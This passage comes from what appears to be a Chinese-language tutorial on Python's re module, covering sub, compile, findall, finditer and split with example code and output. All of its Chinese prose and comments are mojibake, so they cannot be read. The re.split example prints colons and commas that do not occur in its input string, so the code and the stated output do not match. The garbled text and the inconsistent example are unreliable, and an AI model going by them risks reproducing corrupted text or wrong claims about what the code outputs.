search = re.sub(r'[g]','-',a)
print(search)

'''
è¾“å‡ºç»“æœ
Acadsdf-h-jh-jhGhH-hGfFhKmNM
'''
```

å½“ `repl` å‚æ•°ä¸ºä¸€ä¸ªå‡½æ•°æ—¶

å°†åŒ¹é…åˆ°çš„æ•°å…¨éƒ¨ä¹˜2
```py
import re
def double(number):
    value=int(number.group('value'))
    return str(value*2)

s = '12421w gf1wsdqr12315152315'
print(re.sub('(?P<value>\d+)', double, s))

'''
è¾“å‡ºç»“æœ
24842w gf2wsdqr24630304630
'''
```

**re.compile å‡½æ•°**

> ç”¨äºç”Ÿæˆæ­£åˆ™è¡¨è¾¾å¼çš„å¯¹è±¡ï¼Œç”¨äºæä¾› match()å’Œsearch()å‡½æ•°ä½¿ç”¨ã€‚

è¯­æ³•æ ¼å¼æ˜¯ï¼š
`re.compile(patten[,flag])`

ç¤ºä¾‹ï¼š

```py
import re
patten = re.compile(r'[0-9]')
number = patten.findall('o1o2o3o4o5o6')
print(number)
```

**findall å‡½æ•°**

> `match` å’Œ `search` æ˜¯åŒ¹é…ä¸€æ¬¡ï¼Œä½†æ˜¯ `findall` åŒ¹é…æ‰€æœ‰ã€‚

è¯­æ³•æ ¼å¼ï¼š
`findall(string[, pos[, endpos]])`

|å‚æ•°|ä½œç”¨
|-|-|
|string |å¾…åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚
|pos | å¯é€‰å‚æ•°ï¼ŒæŒ‡å®šå­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®ï¼Œé»˜è®¤ä¸º 0ã€‚
|endpos | å¯é€‰å‚æ•°ï¼ŒæŒ‡å®šå­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ï¼Œé»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚

è¯­æ³•ï¼š

```py
import re

pattern = re.compile(r'\d+')   # åªæŸ¥æ‰¾æ•°å­—
result1 = pattern.findall('1o2o3o4o5o6o7')
result2 = pattern.findall('1o2o3o4o5o6o7', 1, 10) # ä»ç¬¬äºŒä½å¼€å§‹

print(result1)
print(result2)

'''
è¾“å‡ºç»“æœ
['1', '2', '3', '4', '5', '6', '7']
['2', '3', '4', '5']
'''
```

**re.finditer å‡½æ•°**

> å’Œ findall ç±»ä¼¼,åœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°æ­£åˆ™è¡¨è¾¾å¼ä¸­åŒ¹é…çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼ŒæŠŠå®ƒä»¬ä½œä¸ºä¸€ä¸ªè¿­ä»£å™¨è¿”å›ã€‚

è¯­æ³•è§„åˆ™ï¼š
`re.finditer(pattern, string, flags=0)`

|å‚æ•°|ä½œç”¨
|-|-|
|pattern|	åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼
|string	|è¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚
|flags	|æ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼ï¼Œå¦‚ï¼šæ˜¯å¦åŒºåˆ†å¤§å°å†™ï¼Œå¤šè¡ŒåŒ¹é…ç­‰ç­‰ã€‚

ç¤ºä¾‹ï¼š
```py
import re

it = re.finditer(r"\d+", "1o2o3o4o5o6o7o") # åœ¨å­—ç¬¦ä¸²ä¸­åŒ¹é…æ•°å­—
for match in it:
    print(match.group())
'''
è¾“å‡ºç»“æœ
1
2
3
4
5
6
7
'''
```


**re.split å‡½æ•°**

> `split` æ–¹æ³•éå¸¸å¼ºå¤§ï¼Œå¯ä»¥ä½¿ç”¨()åˆ†ç»„æ•è·ã€‚ä¸éœ€è¦ä½¿ç”¨span()ä¸€ä¸ªä¸€ä¸ªæ•è·

`re.split(pattern, string[, maxsplit=0, flags=0])`

|å‚æ•°|ä½œç”¨|
|-|-|
|pattern|	åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼
|string	|è¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚
|maxsplit|	åˆ†éš”æ¬¡æ•°ï¼Œmaxsplit=1 åˆ†éš”ä¸€æ¬¡ï¼Œé»˜è®¤ä¸º 0ï¼Œä¸é™åˆ¶|æ¬¡æ•°ã€‚
|flags	|æ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼ï¼Œå¦‚ï¼šæ˜¯å¦åŒºåˆ†å¤§å°å†™ï¼Œå¤šè¡ŒåŒ¹é…ç­‰ç­‰ã€‚

ç”¨äºåŒ¹é…å¤šä¸ªæ¡ä»¶
```py
import re
def re_split_test():
    a = 'å§“åå¼ ä¸‰æ€§åˆ«ç”·èº«ä»½è¯123000000000000000ç”µè¯13800000000'
    re_split_pattern = re.compile('(å§“å|æ€§åˆ«|èº«ä»½è¯|ç”µè¯)')
    list1=re.split(re_split_pattern, a)
    print(list1)

if __name__ == '__main__':
    re_split_test()
'''
è¾“å‡ºç»“æœ
['', 'å§“å', ':å¼ ä¸‰,', 'æ€§åˆ«', ':ç”·,', 'èº«ä»½è¯', ':123000000000000000,', 'ç”µè¯', ':13800000000']
'''
```














